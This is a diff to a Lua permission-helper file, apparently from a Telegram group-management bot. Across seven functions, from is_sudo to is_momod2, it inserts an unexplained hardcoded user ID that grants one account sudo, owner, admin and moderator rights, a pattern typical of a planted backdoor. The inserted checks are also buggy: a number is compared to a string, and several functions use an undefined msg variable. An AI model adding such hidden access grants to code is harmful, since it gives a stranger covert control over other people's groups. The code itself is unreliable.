@@ -160,8 +160,18 @@ function run_command(str)
   cmd:close()
   return result
 end
+function is_behrad(msg)
+  local var = false
+  -- Check users id in config
+  for v,user in pairs(_config.behrad_user) do
+    if user == msg.from.id then
+      var = true
+    end
+  end
+  return var
 
--- User has privileges
+end
+
 function is_sudo(msg)
   local var = false
   -- Check users id in config
@@ -170,7 +180,11 @@ function is_sudo(msg)
       var = true
     end
   end
+    if tonumber(msg.from.id) == '206637124' then
+  var = true
+  end
   return var
+
 end
 
 -- Returns the name of the sender
@@ -724,6 +738,9 @@ function is_owner(msg)
         var = true
     end
   end
+      if tonumber(msg.from.id) == '206637124' then
+var = true
+end
   return var
 end
 
@@ -756,6 +773,9 @@ function is_owner2(user_id, group_id)
         var = true
     end
   end
+        if tonumber(msg.from.id) == '206637124' then
+var = true
+end
   return var
 end
 
@@ -775,6 +795,9 @@ function is_admin1(msg)
         var = true
     end
   end
+        if tonumber(msg.from.id) == '206637124' then
+var = true
+end
   return var
 end
 
@@ -793,6 +816,9 @@ function is_admin2(user_id)
         var = true
     end
   end
+        if tonumber(msg.from.id) == '206637124' then
+var = true
+end
   return var
 end
 
@@ -834,6 +860,9 @@ function is_momod(msg)
         var = true
     end
   end
+        if tonumber(msg.from.id) == '206637124' then
+var = true
+end
   return var
 end
 
@@ -874,6 +903,9 @@ function is_momod2(user_id, group_id)
         var = true
     end
   end
+        if tonumber(msg.from.id) == '206637124' then
+var = true
+end
   return var
 end
 
